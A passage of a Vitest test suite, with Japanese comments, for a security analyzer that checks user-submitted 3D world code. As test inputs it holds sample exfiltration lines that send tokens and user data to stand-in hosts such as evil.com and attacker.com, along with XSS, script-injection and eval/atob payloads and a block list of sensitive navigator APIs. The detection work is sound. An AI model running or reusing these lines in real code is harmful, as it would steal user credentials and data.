import { describe, it, expect } from 'vitest'
import { analyzeCodeSecurity } from '../src/analyzer.js'
import { CodeSecurityService, NEVER_ALLOWABLE_RULES, ALLOWABLE_RULES } from '../src/index.js'
import { adjustViolationSeverity, determineFileContext } from '../src/utils/file-context.js'
import type { FileContext } from '../src/types.js'

describe('CodeSecurityService - analyzer', () => {
  describe('正常系', () => {
    it('正常なコードはviolationなし', () => {
      const code = `
        import { useFrame } from '@react-three/fiber'
        import { RigidBody } from '@react-three/rapier'

        export function createWorld() {
          const mesh = { position: [0, 0, 0] }
          return mesh
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(false)
      expect(signals.hasDynamicCodeExecution).toBe(false)
      expect(signals.hasNetworkAPI).toBe(false)
      expect(signals.hasNavigatorAccess).toBe(false)
      expect(signals.hasStorageAccess).toBe(false)
      expect(signals.hasObfuscatedCode).toBe(false)
      expect(signals.detectedViolations).toHaveLength(0)
    })
  })

  describe('異常系 - eval検出', () => {
    it('eval()の使用を検出', () => {
      const code = `
        const code = "alert('XSS')"
        eval(code)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-eval',
            severity: 'critical',
            message: 'eval()の使用は禁止されています',
          }),
        ])
      )
    })
  })

  describe('異常系 - setTimeout/setInterval 文字列引数検出', () => {
    it('setTimeout に文字列を渡すことを検出', () => {
      const code = `
        setTimeout("alert('XSS')", 1000)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDynamicCodeExecution).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-string-timeout',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - ネットワークAPI検出', () => {
    it('fetch()の使用を検出（no-unauthorized-domain）', () => {
      const code = `
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(userData)
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.referencedDomains).toContain('evil.com')
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-unauthorized-domain',
            severity: 'critical',
          }),
        ])
      )
    })

    it('権限付きfetch()は許可', () => {
      const code = `
        fetch('https://cdn.jsdelivr.net/data.json')
      `

      const signals = analyzeCodeSecurity(code, {
        network: {
          allowedDomains: ['cdn.jsdelivr.net']
        }
      })

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(false)
    })
  })

  describe('異常系 - ストレージアクセス検出', () => {
    it('localStorageアクセスを検出', () => {
      const code = `
        const token = localStorage.getItem('auth_token')
        fetch('https://evil.com/steal?token=' + token)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it('cookieアクセスを検出', () => {
      const code = `
        const cookies = document.cookie
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-cookie-access',
            severity: 'critical',
          }),
        ])
      )
    })

    it("addEventListener('storage', ...)を検出", () => {
      const code = `
        window.addEventListener('storage', (e) => {
          if (e.key === 'xrift-refresh-token') {
            // トークンを傍受
          }
        })
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })

    it('onstorageへの代入を検出', () => {
      const code = `
        window.onstorage = function(e) {
          console.log(e.key, e.newValue)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasStorageAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-storage-event',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('異常系 - navigator検出（ブロックリスト方式）', () => {
    it.each([
      ['sendBeacon', 'navigator.sendBeacon("https://evil.com", data)'],
      ['geolocation', 'navigator.geolocation.getCurrentPosition(cb)'],
      ['credentials', 'navigator.credentials.get({ publicKey: {} })'],
      ['mediaDevices', 'navigator.mediaDevices.getUserMedia({ video: true })'],
      ['clipboard', 'navigator.clipboard.readText()'],
      ['serviceWorker', 'navigator.serviceWorker.register("/sw.js")'],
    ])('navigator.%s へのアクセスを検出', (prop, code) => {
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNavigatorAccess).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-navigator-access',
            severity: 'critical',
            message: expect.stringContaining(`navigator.${prop}`),
          }),
        ])
      )
    })

    it.each([
      ['xr', 'const session = navigator.xr.requestSession("immersive-vr")'],
      ['userAgent', 'const ua = navigator.userAgent'],
      ['platform', 'const p = navigator.platform'],
      ['language', 'const lang = navigator.language'],
      ['hardwareConcurrency', 'const cores = navigator.hardwareConcurrency'],
    ])('navigator.%s へのアクセスは検出しない（正当利用）', (_prop, code) => {
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNavigatorAccess).toBe(false)
      expect(signals.detectedViolations.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
    })

    it('typeof navigator !== "undefined" の存在チェックは検出しない', () => {
      const code = `
        if (typeof navigator !== "undefined") {
          console.log("browser")
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
    })

    it('navigator.xxx = ... の代入は引き続き検出（改ざん防止）', () => {
      const code = `
        navigator.sendBeacon = function() {}
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.hasNavigatorAccess).toBe(true)
    })
  })

  describe('異常系 - DOM操作検出', () => {
    it('innerHTML書き込みを検出', () => {
      const code = `
        const userInput = "<img src=x onerror=alert('XSS')>"
        document.body.innerHTML = userInput
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-dangerous-dom',
            severity: 'critical',
          }),
        ])
      )
    })

    it('document.createElement("script")を検出', () => {
      const code = `
        const script = document.createElement('script')
        script.src = 'https://evil.com/malicious.js'
        document.body.appendChild(script)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasDangerousDOMManipulation).toBe(true)
    })
  })

  describe('異常系 - 難読化検出', () => {
    it('atob()使用を検出', () => {
      const code = `
        const decoded = atob('ZXZpbCBjb2Rl')
        eval(decoded)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-obfuscation',
            severity: 'critical',
          }),
        ])
      )
    })

    it('String.fromCharCode()使用を検出', () => {
      const code = `
        const str = String.fromCharCode(101, 118, 97, 108)
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasObfuscatedCode).toBe(true)
    })
  })

  describe('異常系 - グローバル変数改ざん', () => {
    it('window.fetchの上書きを検出（no-sensitive-api-override）', () => {
      const code = `
        const originalFetch = window.fetch
        window.fetch = function(...args) {
          console.log('Intercepted:', args)
          return originalFetch(...args)
        }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
          }),
        ])
      )
    })

    it('Object.prototypeの汚染を検出', () => {
      const code = `
        Object.prototype.isAdmin = true
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('インポート解析', () => {
    it('許可パッケージのインポートを記録', () => {
      const code = `
        import React from 'react'
        import { Canvas } from '@react-three/fiber'
        import * as THREE from 'three'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.importedPackages).toEqual(['react', '@react-three/fiber', 'three'])
      expect(signals.detectedViolations).toHaveLength(0)
    })

    it('外部URLインポートを検出', () => {
      const code = `
        import malicious from 'https://evil.com/hack.js'
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-external-import',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  // --- 誤検知改善テスト (Issue #9, #10, #11, #12, #13) ---

  describe('Issue #9 - 自クラスの .prototype 定義は誤検知しない', () => {
    it('MyClass.prototype.method = ... は検出しない', () => {
      const code = `
        function MyClass() {}
        MyClass.prototype.render = function() { return null }
        MyClass.prototype.update = function(dt) { this.time += dt }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(false)
      expect(signals.detectedViolations.filter(v => v.rule === 'no-prototype-pollution')).toHaveLength(0)
    })

    it('Object.prototype の汚染は引き続き検出する', () => {
      const code = `
        Object.prototype.isAdmin = true
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })

    it('Array.prototype の汚染も検出する', () => {
      const code = `
        Array.prototype.last = function() { return this[this.length - 1] }
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-prototype-pollution',
            severity: 'critical',
          }),
        ])
      )
    })
  })

  describe('Issue #10 - __REACT_DEVTOOLS_GLOBAL_HOOK__ は誤検知しない', () => {
    it('React DevTools のグローバル変数は疑わしい変数名として検出しない', () => {
      const code = `
        const hook = typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined'
          ? __REACT_DEVTOOLS_GLOBAL_HOOK__
          : null
      `

      const signals = analyzeCodeSecurity(code)

      const obfuscationViolations = signals.detectedViolations.filter(v => v.rule === 'no-obfuscation')
      const hasSuspiciousVarViolation = obfuscationViolations.some(v =>
        v.message.includes('疑わしい変数名')
      )
      expect(hasSuspiciousVarViolation).toBe(false)
    })

    it('webpack のグローバル変数も疑わしい変数名として検出しない', () => {
      const code = `
        const mod = __webpack_require__(123)
        __webpack_exports__["default"] = mod
      `

      const signals = analyzeCodeSecurity(code)

      const hasSuspiciousVarViolation = signals.detectedViolations.some(v =>
        v.rule === 'no-obfuscation' && v.message.includes('疑わしい変数名')
      )
      expect(hasSuspiciousVarViolation).toBe(false)
    })
  })

  describe('Issue #13 - WASM ファイルの fetch は誤検知しない', () => {
    it('.wasm ファイルの fetch はネットワーク違反として検出しない', () => {
      const code = `
        const response = fetch('rapier_wasm_bg.wasm')
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(false)
      expect(signals.hasNetworkWithoutPermission).toBe(false)
      expect(signals.detectedViolations.filter(v =>
        v.rule === 'no-network-without-permission' || v.rule === 'no-unauthorized-domain'
      )).toHaveLength(0)
    })

    it('通常の fetch は引き続き検出する', () => {
      const code = `
        fetch('https://evil.com/data')
      `

      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
    })
  })
})

describe('adjustViolationSeverity - ファイルコンテキスト別の抑制', () => {
  describe('Issue #11 - Vite preload-helper の document.head 誤検知', () => {
    it('preload-helper ファイルの no-dangerous-dom は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'preload-helper-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }

      const result = adjustViolationSeverity('no-dangerous-dom', 'critical', context)
      expect(result).toBeNull()
    })

    it('preload-helper でも no-eval は抑制されない', () => {
      const context: FileContext = {
        filePath: 'preload-helper-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }

      const result = adjustViolationSeverity('no-eval', 'critical', context)
      expect(result).toBe('critical')
    })
  })

  describe('Issue #12 - remoteEntry.js の window/globalThis 警告', () => {
    it('remoteEntry.js の no-global-override は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-global-override', 'critical', context)
      expect(result).toBeNull()
    })

    it('remoteEntry.js の no-dangerous-dom は完全抑制される', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-dangerous-dom', 'critical', context)
      expect(result).toBeNull()
    })

    it('remoteEntry.js でも no-eval は抑制されない', () => {
      const context: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-eval', 'critical', context)
      expect(result).toBe('critical')
    })
  })

  describe('バンドル依存ファイルの技術的違反は完全抑制される', () => {
    const bundledContext: FileContext = {
      filePath: 'vision_bundle-DJzU6HDp.js',
      isUserCode: false,
      isSharedLibrary: false,
      isBundledDependency: true,
    }

    it.each([
      'no-obfuscation',
      'no-dangerous-dom',
      'no-navigator-access',
      'no-prototype-pollution',
      'no-global-override',
      'no-network-without-permission',
      'no-new-function',
    ])('%s は完全抑制される', (rule) => {
      const result = adjustViolationSeverity(rule, 'critical', bundledContext)
      expect(result).toBeNull()
    })

    it.each([
      'no-eval',
      'no-storage-access',
      'no-storage-event',
    ])('%s は critical のまま残る', (rule) => {
      const result = adjustViolationSeverity(rule, 'critical', bundledContext)
      expect(result).toBe('critical')
    })

    it('ユーザーコードでは技術的違反も抑制されない', () => {
      const userContext: FileContext = {
        filePath: '__federation_expose_World-abc123.js',
        isUserCode: true,
        isSharedLibrary: false,
        isBundledDependency: false,
      }

      const result = adjustViolationSeverity('no-obfuscation', 'critical', userContext)
      expect(result).toBe('critical')
    })
  })

  describe('determineFileContext', () => {
    it('ユーザーコード・共有ライブラリ・MFインフラ以外は isBundledDependency: true', () => {
      const context = determineFileContext('any-file.js')
      expect(context.isBundledDependency).toBe(true)
    })

    it('remoteEntry.js は isBundledDependency: false', () => {
      const context = determineFileContext('remoteEntry.js')
      expect(context.isBundledDependency).toBe(false)
    })

    it('ユーザーコードは正しく判定される', () => {
      const context = determineFileContext('__federation_expose_World-abc123.js')
      expect(context.isUserCode).toBe(true)
      expect(context.isBundledDependency).toBe(false)
    })

    it.each([
      ['react', '__federation_shared_react-abc123.js'],
      ['react/jsx-runtime', '__federation_shared_react/jsx-runtime-abc123.js'],
      ['react-dom', '__federation_shared_react-dom-abc123.js'],
      ['react-dom/client', '__federation_shared_react-dom/client-abc123.js'],
      ['three', '__federation_shared_three-abc123.js'],
      ['three/addons', '__federation_shared_three/addons-B-heIOzx.js'],
      ['@react-three/fiber', '__federation_shared_@react-three/fiber-abc123.js'],
      ['@react-three/drei', '__federation_shared_@react-three/drei-abc123.js'],
      ['@react-three/rapier', '__federation_shared_@react-three/rapier-abc123.js'],
      ['@xrift/world-components', '__federation_shared_@xrift/world-components-abc123.js'],
    ])('%s は共有ライブラリとして判定される', (_pkg, path) => {
      const context = determineFileContext(path)
      expect(context.isSharedLibrary).toBe(true)
      expect(context.isBundledDependency).toBe(false)
    })

    it('未知の __federation_shared_ パッケージは共有ライブラリとして判定されない', () => {
      const context = determineFileContext('__federation_shared_unknown-pkg-abc123.js')
      expect(context.isSharedLibrary).toBe(false)
      expect(context.isBundledDependency).toBe(true)
    })
  })
})

describe('サプライチェーン攻撃対策 - ルール細分化', () => {
  describe('no-sensitive-api-override - センシティブ API オーバーライド検出', () => {
    it('window.fetch = ... は no-sensitive-api-override として検出される', () => {
      const code = `
        window.fetch = function(...args) {
          return originalFetch(...args)
        }
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
            message: expect.stringContaining('window.fetch'),
          }),
        ])
      )
    })

    it('window.XMLHttpRequest = ... は no-sensitive-api-override として検出される', () => {
      const code = `
        window.XMLHttpRequest = function() {}
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            message: expect.stringContaining('window.XMLHttpRequest'),
          }),
        ])
      )
    })

    it('window.__THREE__ = ... は no-global-override（従来ルール）として検出される', () => {
      const code = `
        window.__THREE__ = '0.157.0'
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-global-override',
            severity: 'critical',
          }),
        ])
      )
      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
    })
  })

  describe('no-unauthorized-domain - リテラル URL の非許可ドメイン検出', () => {
    it("fetch('https://attacker.com/steal') は no-unauthorized-domain として検出される", () => {
      const code = `
        fetch('https://attacker.com/steal', { body: JSON.stringify(data) })
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-unauthorized-domain',
            severity: 'critical',
            message: expect.stringContaining('attacker.com'),
          }),
        ])
      )
    })

    it('動的 URL の fetch は no-network-without-permission として検出される', () => {
      const code = `
        const url = getApiUrl()
        fetch(url)
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-network-without-permission',
            severity: 'critical',
          }),
        ])
      )
      expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
    })
  })

  describe('neverSuppressRules - バンドル依存でも抑制されない', () => {
    const bundledContext: FileContext = {
      filePath: 'three-Ca30qACE.js',
      isUserCode: false,
      isSharedLibrary: false,
      isBundledDependency: true,
    }

    it('no-sensitive-api-override はバンドル依存でも抑制されない', () => {
      const result = adjustViolationSeverity('no-sensitive-api-override', 'critical', bundledContext)
      expect(result).toBe('critical')
    })

    it('no-unauthorized-domain はバンドル依存でも抑制されない', () => {
      const result = adjustViolationSeverity('no-unauthorized-domain', 'critical', bundledContext)
      expect(result).toBe('critical')
    })

    it('no-global-override はバンドル依存で抑制される（従来通り）', () => {
      const result = adjustViolationSeverity('no-global-override', 'critical', bundledContext)
      expect(result).toBeNull()
    })

    it('no-network-without-permission はバンドル依存で抑制される（従来通り）', () => {
      const result = adjustViolationSeverity('no-network-without-permission', 'critical', bundledContext)
      expect(result).toBeNull()
    })

    it('no-sensitive-api-override は共有ライブラリでも抑制されない', () => {
      const sharedContext: FileContext = {
        filePath: '__federation_shared_react.js',
        isUserCode: false,
        isSharedLibrary: true,
        isBundledDependency: false,
      }
      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', sharedContext)).toBe('critical')
      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', sharedContext)).toBe('critical')
    })

    it('no-sensitive-api-override は remoteEntry.js でも抑制されない', () => {
      const remoteEntryContext: FileContext = {
        filePath: 'remoteEntry.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: false,
      }
      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', remoteEntryContext)).toBe('critical')
      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', remoteEntryContext)).toBe('critical')
    })
  })
})

describe('バイパスパターン検出の強化', () => {
  describe('強化1: computed property によるセンシティブ API オーバーライド', () => {
    it('window["fetch"] = ... は no-sensitive-api-override として検出される', () => {
      const code = `
        window["fetch"] = function(...args) { return null }
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
            message: expect.stringContaining('window.fetch'),
          }),
        ])
      )
    })

    it('window["__THREE__"] = ... は no-global-override として検出される', () => {
      const code = `
        window["__THREE__"] = '0.157.0'
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-global-override',
            severity: 'critical',
          }),
        ])
      )
      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
    })
  })

  describe('強化2: Object.defineProperty / Reflect.set によるセンシティブ API 改ざん', () => {
    it('Object.defineProperty(window, "fetch", ...) は no-sensitive-api-override として検出される', () => {
      const code = `
        Object.defineProperty(window, 'fetch', { value: function() {} })
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
            message: expect.stringContaining('window.fetch'),
          }),
        ])
      )
    })

    it('Object.defineProperty(window, "__THREE__", ...) は no-global-override として検出される', () => {
      const code = `
        Object.defineProperty(window, '__THREE__', { value: '0.157.0' })
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-global-override',
            severity: 'critical',
          }),
        ])
      )
      expect(signals.detectedViolations.filter(v => v.rule === 'no-sensitive-api-override')).toHaveLength(0)
    })

    it('Reflect.set(window, "fetch", ...) は no-sensitive-api-override として検出される', () => {
      const code = `
        Reflect.set(window, 'fetch', function() {})
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasGlobalVariableOverride).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
            message: expect.stringContaining('window.fetch'),
          }),
        ])
      )
    })
  })

  describe('強化3: new Function() コンストラクタ', () => {
    it('new Function("...") でセンシティブ API を参照すると no-sensitive-api-override として検出される', () => {
      const code = `
        const fn = new Function('return fetch')
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(true)
      expect(signals.hasDynamicCodeExecution).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-sensitive-api-override',
            severity: 'critical',
            message: expect.stringContaining('fetch'),
          }),
        ])
      )
    })

    it('new Function("...") で非許可ドメイン URL を参照すると no-unauthorized-domain として検出される', () => {
      const code = `
        new Function('return fetch("https://evil.com/steal")')
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-unauthorized-domain',
            severity: 'critical',
            message: expect.stringContaining('evil.com'),
          }),
        ])
      )
    })

    it('new Function("...") でセンシティブ API も URL も参照しない場合は no-new-function として検出される', () => {
      const code = `
        const fn = new Function('return 1 + 2')
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasEval).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-new-function',
            severity: 'critical',
            message: expect.stringContaining('new Function()'),
          }),
        ])
      )
    })

    it('bundled dependency で no-new-function は抑制されるが no-sensitive-api-override は抑制されない', () => {
      const bundledContext: FileContext = {
        filePath: 'compromised-lib-abc123.js',
        isUserCode: false,
        isSharedLibrary: false,
        isBundledDependency: true,
      }

      // no-new-function は抑制される（rapier 等の正当な使用）
      expect(adjustViolationSeverity('no-new-function', 'critical', bundledContext)).toBeNull()
      // no-sensitive-api-override は抑制されない（攻撃検出）
      expect(adjustViolationSeverity('no-sensitive-api-override', 'critical', bundledContext)).toBe('critical')
      // no-unauthorized-domain も抑制されない（攻撃検出）
      expect(adjustViolationSeverity('no-unauthorized-domain', 'critical', bundledContext)).toBe('critical')
    })
  })

  describe('強化4: .src/.href によるデータ送信', () => {
    it('new Image().src = "https://evil.com/..." は no-unauthorized-domain として検出される', () => {
      const code = `
        new Image().src = 'https://evil.com/steal?data=secret'
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-unauthorized-domain',
            severity: 'critical',
            message: expect.stringContaining('evil.com'),
          }),
        ])
      )
    })
  })

  describe('強化5: dynamic import', () => {
    it('import("https://evil.com/malware.js") は no-unauthorized-domain として検出される', () => {
      const code = `
        import('https://evil.com/malware.js')
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.hasNetworkAPI).toBe(true)
      expect(signals.hasNetworkWithoutPermission).toBe(true)
      expect(signals.detectedViolations).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            rule: 'no-unauthorized-domain',
            severity: 'critical',
            message: expect.stringContaining('evil.com'),
          }),
        ])
      )
    })

    it('import("./chunk.js") は違反なし（相対パス）', () => {
      const code = `
        import('./chunk.js')
      `
      const signals = analyzeCodeSecurity(code)

      expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
    })
  })
})

describe('Issue #25 - 共有ライブラリのスキャンスキップ', () => {
  const service = new CodeSecurityService()

  it('__federation_shared_* ファイルはスキャンされず valid: true を返す', () => {
    const code = `
      eval("malicious code")
      navigator.sendBeacon("https://evil.com", data)
    `
    const context: FileContext = {
      filePath: '__federation_shared_three-addons-B-heIOzx.js',
      isUserCode: false,
      isSharedLibrary: true,
      isBundledDependency: false,
    }

    const result = service.validate({ code, fileContext: context })

    expect(result.valid).toBe(true)
    expect(result.violations.critical).toHaveLength(0)
    expect(result.violations.warnings).toHaveLength(0)
  })

  it('バンドル依存ファイルは引き続きスキャンされる', () => {
    const code = `eval("malicious")`
    const context: FileContext = {
      filePath: 'some-lib-abc123.js',
      isUserCode: false,
      isSharedLibrary: false,
      isBundledDependency: true,
    }

    const result = service.validate({ code, fileContext: context })

    expect(result.valid).toBe(false)
  })
})

describe('Issue #25 - immersiveweb.dev は許可ドメイン', () => {
  it('.src に immersiveweb.dev の URL を代入しても違反にならない', () => {
    const code = `
      img.src = 'https://immersiveweb.dev/ar-module/'
    `

    const signals = analyzeCodeSecurity(code)

    expect(signals.detectedViolations.filter(v => v.rule === 'no-unauthorized-domain')).toHaveLength(0)
  })
})

describe('WorldPermissions モデル対応', () => {
  const service = new CodeSecurityService()

  describe('allowedCodeRules で許可可能ルールの violations が除外される', () => {
    it('no-obfuscation を allowedCodeRules に指定すると violations から除外される', () => {
      const code = `
        const decoded = atob('ZXZpbCBjb2Rl')
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-obfuscation'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
      expect(result.violations.warnings.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
    })

    it('no-dangerous-dom を allowedCodeRules に指定すると violations から除外される', () => {
      const code = `
        document.body.innerHTML = '<div>hello</div>'
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-dangerous-dom'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-dangerous-dom')).toHaveLength(0)
    })

    it('no-navigator-access を allowedCodeRules に指定すると violations から除外される', () => {
      const code = `
        navigator.mediaDevices.getUserMedia({ video: true })
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-navigator-access'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-navigator-access')).toHaveLength(0)
    })

    it('複数の allowedCodeRules を同時に指定できる', () => {
      const code = `
        const decoded = atob('data')
        document.body.innerHTML = decoded
      `

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-obfuscation', 'no-dangerous-dom'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-obfuscation')).toHaveLength(0)
      expect(result.violations.critical.filter(v => v.rule === 'no-dangerous-dom')).toHaveLength(0)
    })
  })

  describe('NEVER_ALLOWABLE_RULES は allowedCodeRules で指定しても除外されない', () => {
    it('no-eval を allowedCodeRules に指定しても violations に残る', () => {
      const code = `eval("alert('xss')")`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-eval'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-eval').length).toBeGreaterThan(0)
      expect(result.permissionWarnings).toEqual(
        expect.arrayContaining([
          expect.stringContaining('no-eval'),
        ])
      )
    })

    it('no-storage-access を allowedCodeRules に指定しても violations に残る', () => {
      const code = `localStorage.getItem('token')`

      const result = service.validate({
        code,
        worldPermissions: {
          allowedCodeRules: ['no-storage-access'],
        },
      })

      expect(result.violations.critical.filter(v => v.rule === 'no-storage-access').length).toBeGreaterThan(0)
    })

